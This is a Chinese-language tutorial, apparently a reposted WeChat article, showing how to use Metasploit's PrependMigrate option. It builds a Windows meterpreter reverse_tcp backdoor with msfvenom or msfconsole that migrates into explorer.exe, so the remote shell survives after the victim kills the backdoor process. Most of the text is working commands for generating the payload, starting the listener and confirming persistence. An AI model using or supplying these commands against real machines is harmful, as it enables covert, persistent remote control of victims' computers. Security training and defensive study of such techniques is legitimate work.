# 使用PrependMigrate隐藏Metasploit的shell

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI2NDY1NDg0OA==&mid=2247483876&idx=1&sn=a9dfa3af32c1f7431d54ad3f06d7d3e7&chksm=eaa8188bdddf919d01a9356a5b2e41e49943707cc05b78552205b129fb6597bef2f17d838901&scene=126&sessionid=1681654137#rd](http://mp.weixin.qq.com/s?__biz=MzI2NDY1NDg0OA==&mid=2247483876&idx=1&sn=a9dfa3af32c1f7431d54ad3f06d7d3e7&chksm=eaa8188bdddf919d01a9356a5b2e41e49943707cc05b78552205b129fb6597bef2f17d838901&scene=126&sessionid=1681654137#rd)

主要是使用PrependMigrate在metasploite创建shell初期就将后门有效负载迁移到目标计算机上的正在运行的进程中，此时，即使受害者终止了后门进程，shell还可以正常使用。

Metasploit框架

Metasploit Framework是一个开源工具，针对目标计算机进行漏洞的开发和利用。

  

环境：kali linux， windows 7

## 方法一：

在配置生成后门文件时，直接配置相应的参数，使后门进程直接迁移到explore.exe的进程中。生成后门文件的命令如下：

Msfvenom -pwindows/meterpreter/reverse\_tcp lhost=192.168.198.130 lport=1234prependmigrateprocess=explorer.exe prependmigrate=true -f exe >alter.exe

![](../Images/1811aa660a899b8257f1317e527df020.png)

  

接下来，使用msfconsole在本地进行监听。

Useexploit/multi/handler

Set payloadwindows/meterpreter/reverse\_tcp

Set lhost 192.168.

Set lport 1234

Exploit

![](../Images/bea040a418147bcbdd02d59425d4dc97.png)

  

监听已经建立了，把生成的后门文件在目标机上运行。会话就建立起来了。

使用ps | grep alter7.exe

![](../Images/faaca78ce4628e36410bf942a69100eb.png)

  

得到目标机上的alter7.exe的进程ID，再使用kill ID，终止后门文件的进程。输入sysinfo，可以获取到系统的信息，说明后门文件的进程已经成功的迁移到explorer.exe中了。

![](../Images/8c39b820fbfdfffb5e7fbac1c155b54c.png)

  

## 方法二：

直接在msfconsole中配置生成后门文件。使用如下命令：  
use windows/meterpreter/reverse\_tcp

Set lhost 192.168

Set lport 4444

Set prependmigratetrue

Setprependmigrateprocess explorer.exe

Generate -f .exe -oaa.exe

![](../Images/0947adc7c66e3e894d5d87ba07d2b85f.png)

  

在本地建立监听，

Use exploit/multi/handler

Set payloadwindows/meterpreter/reverse\_tcp

Set lhost 192.168

Set lport 4444

Exploit

![](../Images/db59870159ec67f51bdb23aa8cf20008.png)

  

然后使用ps和grep查看aa.exe的进程。

Ps |grep aa.exe

![](../Images/41d51cb333d354165f223814e52a21e0.png)

  

获得aa.exe的进程ID

验证进程迁移是否成功

Kill PID

会话中执行sysinfo,可以获得系统的信息。表示进程迁移成功。

![](../Images/931c992925cfc017337c122e2eec6553.png)
